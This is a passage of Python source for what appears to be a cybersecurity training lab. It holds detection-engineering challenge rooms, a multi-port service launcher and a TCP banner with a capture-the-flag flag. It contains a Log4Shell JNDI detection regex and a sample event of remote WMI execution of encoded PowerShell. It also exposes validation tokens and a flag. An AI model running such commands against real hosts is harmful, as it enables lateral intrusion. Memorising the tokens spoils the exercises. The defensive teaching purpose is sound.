    return JSONResponse({
        "status": "SURICATA_PCRE_TUNED_OK",
        "pcre": "/\\$\\{jndi:(ldap[s]?|rmi|dns):/Ui",
        "fast_pattern": "jndi",
        "message": "Suricata PCRE and fast_pattern optimized: regex execution anchored with O(n) bounded evaluation.",
    })


@detection_suricata_app.api_route("/challenge", methods=["GET", "POST"])
@detection_suricata_app.api_route("/api/detection/suricata/challenge", methods=["GET", "POST"])
@detection_suricata_app.api_route("/api/detection-suricata/challenge", methods=["GET", "POST"])
async def detection_suricata_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_suricata_state(sess_id)
        if not (state.get("suricata_emulated") and state.get("pcre_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Suricata signature must be emulated and PCRE parameters tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "SURICATA" in action or action == "SURICATA_SIGNATURE_VALIDATED":
            state["suricata_validated"] = True
            return JSONResponse({
                "status": "SURICATA_SIGNATURE_VALIDATED",
                "verification_token": "SURICATA_SIGNATURE_VALIDATED",
                "message": "Suricata signature challenge validated: high-performance network intrusion signature operationalized with zero packet drops.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_SURICATA_SIGNATURE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_SURICATA_SIGNATURE').",
    })


# ============================================================================
# DETECTION ROOM 18: THREAT HUNTING HYPOTHESIS FORMULATION (PORT 8418)
# ============================================================================

detection_hunt_hypothesis_app = FastAPI(title="NO ENTRY Detection Engineering 18: Threat Hunting Hypothesis Formulation")


@detection_hunt_hypothesis_app.api_route("/", methods=["GET", "HEAD"])
def detection_hunt_hypothesis_root():
    return {
        "service": "NO ENTRY Detection Engineering // Threat Hunting Hypothesis Engine",
        "port": 8418,
        "track": "Detection Engineering",
        "room": "Room 18: Threat Hunting Hypothesis Formulation",
        "endpoints": [
            "/api/detection/threat-hunting/corpus",
            "/api/detection/threat-hunting/emulate",
            "/api/detection/threat-hunting/tune-hypothesis",
            "/api/detection/threat-hunting/challenge",
        ],
    }


@detection_hunt_hypothesis_app.get("/api/detection/threat-hunting/corpus")
@detection_hunt_hypothesis_app.get("/api/detection-threat-hunting/corpus")
def detection_hunt_hypothesis_corpus():
    return JSONResponse({
        "status": "TELEMETRY_CORPUS_READY",
        "hunting_model": "TaHiTI Intelligence-Driven Hunt v2.1",
        "target_ttp": "T1047 (WMI Living-off-the-Land Execution)",
        "events": [
            {
                "event_id": 1,
                "process": "wmic.exe",
                "command_line": "wmic.exe /node:10.0.1.50 process call create 'powershell.exe -enc JABj...'",
                "parent_process": "cmd.exe",
                "user": "CORP\\compromised_admin",
                "host_count": 1,
                "classification": "ATTACK_REMOTE_WMI_EXECUTION",
            },
            {
                "event_id": 1,
                "process": "wmic.exe",
                "command_line": "wmic.exe OS get Caption,OSArchitecture",
                "parent_process": "SCCM_Client.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "host_count": 850,
                "classification": "BENIGN_SCCM_INVENTORY_QUERY",
            },
        ],
    })


@detection_hunt_hypothesis_app.post("/api/detection/threat-hunting/emulate")
@detection_hunt_hypothesis_app.post("/api/detection-threat-hunting/emulate")
async def detection_hunt_hypothesis_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_hunt_hypothesis_state(sess_id)
    state["hunt_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "THREAT_HUNT_HYPOTHESIS_VERIFIED",
        "verification_token": "THREAT_HUNT_HYPOTHESIS_VERIFIED",
        "hypothesis": "Adversary abuses WMI process call create for lateral execution",
        "stacking_anomaly_detected": True,
        "rare_frequency_score": 1,
        "message": "Threat hunting hypothesis evaluated: rare WMI execution singleton detected across 851 corporate endpoints.",
    })


@detection_hunt_hypothesis_app.post("/api/detection/threat-hunting/tune-hypothesis")
@detection_hunt_hypothesis_app.post("/api/detection-threat-hunting/tune-hypothesis")
async def detection_hunt_hypothesis_tune(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_hunt_hypothesis_state(sess_id)
    state["hypothesis_tuned"] = True
    return JSONResponse({
        "status": "HUNT_HYPOTHESIS_TUNED_OK",
        "baseline_exclusion": "parent_process: SCCM_Client.exe AND command_line: OS get Caption*",
        "message": "Threat hunting baseline filter applied: legitimate SCCM inventory queries suppressed, isolating genuine attacker tradecraft.",
    })


@detection_hunt_hypothesis_app.api_route("/challenge", methods=["GET", "POST"])
@detection_hunt_hypothesis_app.api_route("/api/detection/threat-hunting/challenge", methods=["GET", "POST"])
@detection_hunt_hypothesis_app.api_route("/api/detection-threat-hunting/challenge", methods=["GET", "POST"])
async def detection_hunt_hypothesis_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_hunt_hypothesis_state(sess_id)
        if not (state.get("hunt_emulated") and state.get("hypothesis_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Threat hunting hypothesis must be emulated and baseline filter tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "HUNT" in action or "HYPOTHESIS" in action or action == "THREAT_HUNT_HYPOTHESIS_VALIDATED":
            state["hunt_validated"] = True
            return JSONResponse({
                "status": "THREAT_HUNT_HYPOTHESIS_VALIDATED",
                "verification_token": "THREAT_HUNT_HYPOTHESIS_VALIDATED",
                "message": "Threat hunting challenge validated: covert living-off-the-land activity confirmed and transitioned to permanent SIEM detection rule.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_THREAT_HUNT')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_THREAT_HUNT').",
    })


# ============================================================================
# DETECTION ROOM 19: CI/CD PIPELINES FOR DETECTION RULES (PORT 8419)
# ============================================================================

detection_pipeline_app = FastAPI(title="NO ENTRY Detection Engineering 19: CI/CD Pipelines for Detection Rules")


@detection_pipeline_app.api_route("/", methods=["GET", "HEAD"])
def detection_pipeline_root():
    return {
        "service": "NO ENTRY Detection Engineering // Detection-as-Code CI/CD Pipeline Engine",
        "port": 8419,
        "track": "Detection Engineering",
        "room": "Room 19: CI/CD Pipelines for Detection Rules",
        "endpoints": [
            "/api/detection/pipeline/definition",
            "/api/detection/pipeline/emulate",
            "/api/detection/pipeline/tune-pipeline",
            "/api/detection/pipeline/challenge",
        ],
    }


@detection_pipeline_app.get("/api/detection/pipeline/definition")
@detection_pipeline_app.get("/api/detection-pipeline/definition")
def detection_pipeline_definition():
    return JSONResponse({
        "pipeline_name": "detection-as-code-ci-cd",
        "version_control": "GitLab CI / GitHub Actions",
        "stages": ["lint", "test", "security-review", "deploy"],
        "rules_in_pipeline": [
            {"rule_id": "sigma-proc-01", "name": "PowerShell Encoded Download", "format": "Sigma YAML v2.0", "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]},
            {"rule_id": "sigma-proc-02", "name": "Certutil LOLBIN Web Request", "format": "Sigma YAML v2.0", "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]},
        ],
        "status": "PIPELINE_STAGES_LOADED",
    })


@detection_pipeline_app.post("/api/detection/pipeline/emulate")
@detection_pipeline_app.post("/api/detection-pipeline/emulate")
async def detection_pipeline_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_pipeline_state(sess_id)
    state["pipeline_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "DETECTION_PIPELINE_VERIFIED",
        "verification_token": "DETECTION_PIPELINE_VERIFIED",
        "stage_lint": "PASSED",
        "stage_test": "PASSED",
        "stage_transpilation": "PASSED",
        "message": "Detection-as-Code pipeline evaluated: all Sigma rules passed automated linting, synthetic log execution, and transpilation gates.",
    })


@detection_pipeline_app.post("/api/detection/pipeline/tune-pipeline")
@detection_pipeline_app.post("/api/detection-pipeline/tune-pipeline")
async def detection_pipeline_tune(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_pipeline_state(sess_id)
    state["pipeline_tuned"] = True
    return JSONResponse({
        "status": "PIPELINE_GATE_TUNED_OK",
        "branch_protection": "STRICT_MERGE_REQUIRES_REVIEW_AND_PASSING_TESTS",
        "automated_rollback": "ENABLED",
        "message": "Pipeline gates configured: strict branch protection and automated canary rollbacks enabled for zero-downtime rule deployment.",
    })


@detection_pipeline_app.api_route("/challenge", methods=["GET", "POST"])
@detection_pipeline_app.api_route("/api/detection/pipeline/challenge", methods=["GET", "POST"])
@detection_pipeline_app.api_route("/api/detection-pipeline/challenge", methods=["GET", "POST"])
async def detection_pipeline_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_pipeline_state(sess_id)
        if not (state.get("pipeline_emulated") and state.get("pipeline_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: CI/CD detection pipeline must be emulated and merge gates tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "PIPELINE" in action or action == "DETECTION_PIPELINE_VALIDATED":
            state["pipeline_validated"] = True
            return JSONResponse({
                "status": "DETECTION_PIPELINE_VALIDATED",
                "verification_token": "DETECTION_PIPELINE_VALIDATED",
                "message": "Detection CI/CD pipeline challenge validated: automated detection engineering deployment pipeline operationalized.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_DETECTION_PIPELINE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_DETECTION_PIPELINE').",
    })


# ============================================================================
# DETECTION ROOM 20: DETECTION ENGINEERING CAPSTONE (PORT 8420)
# ============================================================================

detection_capstone_app = FastAPI(title="NO ENTRY Detection Engineering 20: Detection Engineering Capstone: Production Pipeline")


@detection_capstone_app.api_route("/", methods=["GET", "HEAD"])
def detection_capstone_root():
    return {
        "service": "NO ENTRY Detection Engineering // Production Pipeline Capstone Engine",
        "port": 8420,
        "track": "Detection Engineering",
        "room": "Room 20: Detection Engineering Capstone: Production Pipeline",
        "endpoints": [
            "/api/detection/capstone/pipeline",
            "/api/detection/capstone/emulate",
            "/api/detection/capstone/tune-production",
            "/api/detection/capstone/challenge",
        ],
    }


@detection_capstone_app.get("/api/detection/capstone/pipeline")
@detection_capstone_app.get("/api/detection-capstone/pipeline")
def detection_capstone_pipeline():
    return JSONResponse({
        "status": "ENTERPRISE_PIPELINE_ONLINE",
        "architecture": "Multi-Tier Detection-as-Code Production Grid",
        "active_layers": [
            {"layer": 1, "type": "Network Intrusion (Suricata)", "monitored_subnets": 12, "active_rules": 420},
            {"layer": 2, "type": "Host Behavioral (Sigma / EDR)", "monitored_hosts": 1250, "active_rules": 185},
            {"layer": 3, "type": "Memory & File Hunting (YARA)", "scanned_endpoints": 1250, "active_rules": 64},
            {"layer": 4, "type": "Correlation & Alerting (SIEM)", "correlation_chains": 18, "status": "SYNCHRONIZED"},
        ],
    })


@detection_capstone_app.post("/api/detection/capstone/emulate")
@detection_capstone_app.post("/api/detection-capstone/emulate")
async def detection_capstone_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_capstone_state(sess_id)
    state["capstone_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "CAPSTONE_PIPELINE_VERIFIED",
        "verification_token": "CAPSTONE_PIPELINE_VERIFIED",
        "true_positive_rate_pct": 100,
        "false_positive_rate_pct": 0,
        "transpilation_status": "ALL_BACKENDS_SYNCHRONIZED",
        "message": "Detection Engineering Capstone evaluated: end-to-end production detection pipeline validated with 100% sensitivity and 0% false positives.",
    })


@detection_capstone_app.post("/api/detection/capstone/tune-production")
@detection_capstone_app.post("/api/detection-capstone/tune-production")
async def detection_capstone_tune(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_capstone_state(sess_id)
    state["production_tuned"] = True
    return JSONResponse({
        "status": "CAPSTONE_PRODUCTION_TUNED_OK",
        "soc_playbook": "VERIFIED_ATTACHED",
        "mitre_coverage_score": 100,
        "message": "Capstone production tuning verified: SOC playbooks attached, ECS schema validation enforced, and full MITRE ATT&CK coverage certified.",
    })


@detection_capstone_app.api_route("/challenge", methods=["GET", "POST"])
@detection_capstone_app.api_route("/api/detection/capstone/challenge", methods=["GET", "POST"])
@detection_capstone_app.api_route("/api/detection-capstone/challenge", methods=["GET", "POST"])
async def detection_capstone_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_capstone_state(sess_id)
        if not (state.get("capstone_emulated") and state.get("production_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Capstone pipeline must be emulated and production tuning verified before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "CAPSTONE" in action or action == "CAPSTONE_PIPELINE_VALIDATED":
            state["capstone_validated"] = True
            return JSONResponse({
                "status": "CAPSTONE_PIPELINE_VALIDATED",
                "verification_token": "CAPSTONE_PIPELINE_VALIDATED",
                "message": "Detection Engineering Capstone validated: complete enterprise Detection-as-Code production pipeline certified.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_CAPSTONE_PIPELINE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_CAPSTONE_PIPELINE').",
    })


# ============================================================================
# MULTI-SERVICE ENGINE & RAW TCP SERVER
# ============================================================================

async def handle_tcp_client(reader, writer):
    banner = (
        b"==============================================================\n"
        b"NO ENTRY ACADEMY // RAW TCP SOCKET SERVICE\n"
        b"Protocol: Raw Transmission Control Protocol (Layer 4)\n"
        b"Connection: ESTABLISHED (3-Way Handshake SYN->SYN-ACK->ACK)\n"
        b"Flag: NOENTRY{net_raw_tcp_socket_8832}\n"
        b"==============================================================\n"
    )
    writer.write(banner)
    await writer.drain()
    writer.close()
    await writer.wait_closed()


async def start_all_services():
    import asyncio
    import uvicorn

    init_target_db()

    config_8089 = uvicorn.Config(target_app, host="0.0.0.0", port=8089, log_level="warning")
    server_8089 = uvicorn.Server(config_8089)

    config_8081 = uvicorn.Config(foundations_app, host="0.0.0.0", port=8081, log_level="warning")
    server_8081 = uvicorn.Server(config_8081)

    config_8080 = uvicorn.Config(network_app, host="0.0.0.0", port=8080, log_level="warning")
    server_8080 = uvicorn.Server(config_8080)

    config_8090 = uvicorn.Config(recon_app, host="0.0.0.0", port=8090, log_level="warning")
    server_8090 = uvicorn.Server(config_8090)

    config_8085 = uvicorn.Config(scanning_app, host="0.0.0.0", port=8085, log_level="warning")
    server_8085 = uvicorn.Server(config_8085)

    config_8086 = uvicorn.Config(enum_app, host="0.0.0.0", port=8086, log_level="warning")
    server_8086 = uvicorn.Server(config_8086)

    config_8087 = uvicorn.Config(vuln_app, host="0.0.0.0", port=8087, log_level="warning")
    server_8087 = uvicorn.Server(config_8087)

    config_8088 = uvicorn.Config(webapp_app, host="0.0.0.0", port=8088, log_level="warning")
    server_8088 = uvicorn.Server(config_8088)

    config_8091 = uvicorn.Config(xss_app, host="0.0.0.0", port=8091, log_level="warning")
    server_8091 = uvicorn.Server(config_8091)

    config_8092 = uvicorn.Config(auth_app, host="0.0.0.0", port=8092, log_level="warning")
    server_8092 = uvicorn.Server(config_8092)

    config_8093 = uvicorn.Config(access_app, host="0.0.0.0", port=8093, log_level="warning")
    server_8093 = uvicorn.Server(config_8093)

    config_8094 = uvicorn.Config(upload_app, host="0.0.0.0", port=8094, log_level="warning")
    server_8094 = uvicorn.Server(config_8094)

    config_8095 = uvicorn.Config(cmd_app, host="0.0.0.0", port=8095, log_level="warning")
    server_8095 = uvicorn.Server(config_8095)

    config_8096 = uvicorn.Config(traversal_app, host="0.0.0.0", port=8096, log_level="warning")
    server_8096 = uvicorn.Server(config_8096)

    config_8097 = uvicorn.Config(password_app, host="0.0.0.0", port=8097, log_level="warning")
    server_8097 = uvicorn.Server(config_8097)

    config_8098 = uvicorn.Config(privesc_app, host="0.0.0.0", port=8098, log_level="warning")
    server_8098 = uvicorn.Server(config_8098)

    config_8099 = uvicorn.Config(ad_app, host="0.0.0.0", port=8099, log_level="warning")
    server_8099 = uvicorn.Server(config_8099)

    config_8100 = uvicorn.Config(exploit_app, host="0.0.0.0", port=8100, log_level="warning")
    server_8100 = uvicorn.Server(config_8100)

    config_8101 = uvicorn.Config(capstone_app, host="0.0.0.0", port=8101, log_level="warning")
    server_8101 = uvicorn.Server(config_8101)

    config_8201 = uvicorn.Config(soc_app, host="0.0.0.0", port=8201, log_level="warning")
    server_8201 = uvicorn.Server(config_8201)

    config_8202 = uvicorn.Config(win_security_app, host="0.0.0.0", port=8202, log_level="warning")
    server_8202 = uvicorn.Server(config_8202)

    config_8203 = uvicorn.Config(linux_monitoring_app, host="0.0.0.0", port=8203, log_level="warning")
    server_8203 = uvicorn.Server(config_8203)

    config_8204 = uvicorn.Config(traffic_app, host="0.0.0.0", port=8204, log_level="warning")
    server_8204 = uvicorn.Server(config_8204)

    config_8205 = uvicorn.Config(wireshark_lab_app, host="0.0.0.0", port=8205, log_level="warning")
    server_8205 = uvicorn.Server(config_8205)

    config_8206 = uvicorn.Config(log_analysis_app, host="0.0.0.0", port=8206, log_level="warning")
    server_8206 = uvicorn.Server(config_8206)

    config_8207 = uvicorn.Config(siem_lab_app, host="0.0.0.0", port=8207, log_level="warning")
    server_8207 = uvicorn.Server(config_8207)

    config_8208 = uvicorn.Config(win_event_app, host="0.0.0.0", port=8208, log_level="warning")
    server_8208 = uvicorn.Server(config_8208)

    config_8209 = uvicorn.Config(bruteforce_app, host="0.0.0.0", port=8209, log_level="warning")
    server_8209 = uvicorn.Server(config_8209)

    config_8210 = uvicorn.Config(malware_analysis_app, host="0.0.0.0", port=8210, log_level="warning")
    server_8210 = uvicorn.Server(config_8210)

    config_8211 = uvicorn.Config(phishing_app, host="0.0.0.0", port=8211, log_level="warning")
    server_8211 = uvicorn.Server(config_8211)

    config_8212 = uvicorn.Config(endpoint_app, host="0.0.0.0", port=8212, log_level="warning")
    server_8212 = uvicorn.Server(config_8212)

    config_8213 = uvicorn.Config(nids_app, host="0.0.0.0", port=8213, log_level="warning")
    server_8213 = uvicorn.Server(config_8213)

    config_8214 = uvicorn.Config(threat_hunt_app, host="0.0.0.0", port=8214, log_level="warning")
    server_8214 = uvicorn.Server(config_8214)

    config_8215 = uvicorn.Config(triage_app, host="0.0.0.0", port=8215, log_level="warning")
    server_8215 = uvicorn.Server(config_8215)

    config_8216 = uvicorn.Config(incident_response_app, host="0.0.0.0", port=8216, log_level="warning")
    server_8216 = uvicorn.Server(config_8216)

    config_8217 = uvicorn.Config(forensics_app, host="0.0.0.0", port=8217, log_level="warning")
    server_8217 = uvicorn.Server(config_8217)

    config_8218 = uvicorn.Config(hardening_app, host="0.0.0.0", port=8218, log_level="warning")
    server_8218 = uvicorn.Server(config_8218)

    config_8219 = uvicorn.Config(threat_intel_app, host="0.0.0.0", port=8219, log_level="warning")
    server_8219 = uvicorn.Server(config_8219)

    config_8220 = uvicorn.Config(blue_capstone_app, host="0.0.0.0", port=8220, log_level="warning")
    server_8220 = uvicorn.Server(config_8220)

    config_8301 = uvicorn.Config(purple_foundations_app, host="0.0.0.0", port=8301, log_level="warning")
    server_8301 = uvicorn.Server(config_8301)

    config_8302 = uvicorn.Config(purple_attck_app, host="0.0.0.0", port=8302, log_level="warning")
    server_8302 = uvicorn.Server(config_8302)

    config_8303 = uvicorn.Config(purple_simulation_app, host="0.0.0.0", port=8303, log_level="warning")
    server_8303 = uvicorn.Server(config_8303)

    config_8304 = uvicorn.Config(purple_recon_app, host="0.0.0.0", port=8304, log_level="warning")
    server_8304 = uvicorn.Server(config_8304)

    config_8305 = uvicorn.Config(purple_privesc_app, host="0.0.0.0", port=8305, log_level="warning")
    server_8305 = uvicorn.Server(config_8305)

    config_8306 = uvicorn.Config(purple_injection_app, host="0.0.0.0", port=8306, log_level="warning")
    server_8306 = uvicorn.Server(config_8306)

    config_8307 = uvicorn.Config(purple_lateral_app, host="0.0.0.0", port=8307, log_level="warning")
    server_8307 = uvicorn.Server(config_8307)

    config_8308 = uvicorn.Config(purple_persist_app, host="0.0.0.0", port=8308, log_level="warning")
    server_8308 = uvicorn.Server(config_8308)

    config_8309 = uvicorn.Config(purple_c2_app, host="0.0.0.0", port=8309, log_level="warning")
    server_8309 = uvicorn.Server(config_8309)

    config_8310 = uvicorn.Config(purple_exfil_app, host="0.0.0.0", port=8310, log_level="warning")
    server_8310 = uvicorn.Server(config_8310)

    config_8311 = uvicorn.Config(purple_ransomware_app, host="0.0.0.0", port=8311, log_level="warning")
    server_8311 = uvicorn.Server(config_8311)

    config_8312 = uvicorn.Config(purple_cloud_app, host="0.0.0.0", port=8312, log_level="warning")
    server_8312 = uvicorn.Server(config_8312)

    config_8313 = uvicorn.Config(purple_supply_chain_app, host="0.0.0.0", port=8313, log_level="warning")
    server_8313 = uvicorn.Server(config_8313)

    config_8314 = uvicorn.Config(purple_api_abuse_app, host="0.0.0.0", port=8314, log_level="warning")
    server_8314 = uvicorn.Server(config_8314)

    config_8315 = uvicorn.Config(purple_ad_attacks_app, host="0.0.0.0", port=8315, log_level="warning")
    server_8315 = uvicorn.Server(config_8315)

    config_8316 = uvicorn.Config(purple_cicd_pipeline_app, host="0.0.0.0", port=8316, log_level="warning")
    server_8316 = uvicorn.Server(config_8316)

    config_8317 = uvicorn.Config(purple_edr_bypass_app, host="0.0.0.0", port=8317, log_level="warning")
    server_8317 = uvicorn.Server(config_8317)

    config_8318 = uvicorn.Config(purple_heatmap_app, host="0.0.0.0", port=8318, log_level="warning")
    server_8318 = uvicorn.Server(config_8318)

    config_8319 = uvicorn.Config(purple_continuous_val_app, host="0.0.0.0", port=8319, log_level="warning")
    server_8319 = uvicorn.Server(config_8319)

    config_8320 = uvicorn.Config(purple_capstone_app, host="0.0.0.0", port=8320, log_level="warning")
    server_8320 = uvicorn.Server(config_8320)

    config_8401 = uvicorn.Config(detection_foundations_app, host="0.0.0.0", port=8401, log_level="warning")
    server_8401 = uvicorn.Server(config_8401)

    config_8402 = uvicorn.Config(detection_normalization_app, host="0.0.0.0", port=8402, log_level="warning")
    server_8402 = uvicorn.Server(config_8402)

    config_8403 = uvicorn.Config(detection_sigma_syntax_app, host="0.0.0.0", port=8403, log_level="warning")
    server_8403 = uvicorn.Server(config_8403)

    config_8404 = uvicorn.Config(detection_process_creation_app, host="0.0.0.0", port=8404, log_level="warning")
    server_8404 = uvicorn.Server(config_8404)

    config_8405 = uvicorn.Config(detection_network_rules_app, host="0.0.0.0", port=8405, log_level="warning")
    server_8405 = uvicorn.Server(config_8405)

    config_8406 = uvicorn.Config(detection_file_registry_app, host="0.0.0.0", port=8406, log_level="warning")
    server_8406 = uvicorn.Server(config_8406)

    config_8407 = uvicorn.Config(detection_auth_abuse_app, host="0.0.0.0", port=8407, log_level="warning")
    server_8407 = uvicorn.Server(config_8407)

    config_8408 = uvicorn.Config(detection_powershell_app, host="0.0.0.0", port=8408, log_level="warning")
    server_8408 = uvicorn.Server(config_8408)

    config_8409 = uvicorn.Config(detection_web_rules_app, host="0.0.0.0", port=8409, log_level="warning")
    server_8409 = uvicorn.Server(config_8409)

    config_8410 = uvicorn.Config(detection_modsec_app, host="0.0.0.0", port=8410, log_level="warning")
    server_8410 = uvicorn.Server(config_8410)

    config_8411 = uvicorn.Config(detection_wazuh_app, host="0.0.0.0", port=8411, log_level="warning")
    server_8411 = uvicorn.Server(config_8411)

    config_8412 = uvicorn.Config(detection_false_positive_app, host="0.0.0.0", port=8412, log_level="warning")
    server_8412 = uvicorn.Server(config_8412)

    config_8413 = uvicorn.Config(detection_threshold_app, host="0.0.0.0", port=8413, log_level="warning")
    server_8413 = uvicorn.Server(config_8413)

    config_8414 = uvicorn.Config(detection_correlation_app, host="0.0.0.0", port=8414, log_level="warning")
    server_8414 = uvicorn.Server(config_8414)

    config_8415 = uvicorn.Config(detection_unit_testing_app, host="0.0.0.0", port=8415, log_level="warning")
    server_8415 = uvicorn.Server(config_8415)

    config_8416 = uvicorn.Config(detection_yara_hunting_app, host="0.0.0.0", port=8416, log_level="warning")
    server_8416 = uvicorn.Server(config_8416)

    config_8417 = uvicorn.Config(detection_suricata_app, host="0.0.0.0", port=8417, log_level="warning")
    server_8417 = uvicorn.Server(config_8417)

    config_8418 = uvicorn.Config(detection_hunt_hypothesis_app, host="0.0.0.0", port=8418, log_level="warning")
    server_8418 = uvicorn.Server(config_8418)

    config_8419 = uvicorn.Config(detection_pipeline_app, host="0.0.0.0", port=8419, log_level="warning")
    server_8419 = uvicorn.Server(config_8419)

    config_8420 = uvicorn.Config(detection_capstone_app, host="0.0.0.0", port=8420, log_level="warning")
    server_8420 = uvicorn.Server(config_8420)

    tcp_server_9001 = await asyncio.start_server(handle_tcp_client, "0.0.0.0", 9001)
    tcp_server_2121 = await asyncio.start_server(handle_ftp_client, "0.0.0.0", 2121)
    tcp_server_2222 = await asyncio.start_server(handle_ssh_client, "0.0.0.0", 2222)

    await asyncio.gather(
        server_8089.serve(),
        server_8081.serve(),
        server_8080.serve(),
        server_8090.serve(),
        server_8085.serve(),
        server_8086.serve(),
        server_8087.serve(),
        server_8088.serve(),
        server_8091.serve(),
        server_8092.serve(),
        server_8093.serve(),
        server_8094.serve(),
        server_8095.serve(),
        server_8096.serve(),
        server_8097.serve(),
        server_8098.serve(),
        server_8099.serve(),
        server_8100.serve(),
        server_8101.serve(),
        server_8201.serve(),
        server_8202.serve(),
        server_8203.serve(),
        server_8204.serve(),
        server_8205.serve(),
        server_8206.serve(),
        server_8207.serve(),
        server_8208.serve(),
        server_8209.serve(),
        server_8210.serve(),
        server_8211.serve(),
        server_8212.serve(),
        server_8213.serve(),
        server_8214.serve(),
        server_8215.serve(),
        server_8216.serve(),
        server_8217.serve(),
        server_8218.serve(),
        server_8219.serve(),
        server_8220.serve(),
        server_8301.serve(),
        server_8302.serve(),
        server_8303.serve(),
        server_8304.serve(),
        server_8305.serve(),
        server_8306.serve(),
        server_8307.serve(),
        server_8308.serve(),
        server_8309.serve(),
        server_8310.serve(),
        server_8311.serve(),
        server_8312.serve(),
        server_8313.serve(),
        server_8314.serve(),
        server_8315.serve(),
        server_8316.serve(),
        server_8317.serve(),
        server_8318.serve(),
        server_8319.serve(),
        server_8320.serve(),
        server_8401.serve(),
        server_8402.serve(),
        server_8403.serve(),
        server_8404.serve(),
        server_8405.serve(),
        server_8406.serve(),
        server_8407.serve(),
        server_8408.serve(),
        server_8409.serve(),
        server_8410.serve(),
        server_8411.serve(),
        server_8412.serve(),
        server_8413.serve(),
        server_8414.serve(),
        server_8415.serve(),
        server_8416.serve(),
        server_8417.serve(),
        server_8418.serve(),
        server_8419.serve(),
        server_8420.serve(),
        tcp_server_9001.serve_forever(),
        tcp_server_2121.serve_forever(),
        tcp_server_2222.serve_forever(),
    )


if __name__ == "__main__":
    import asyncio
    asyncio.run(start_all_services())

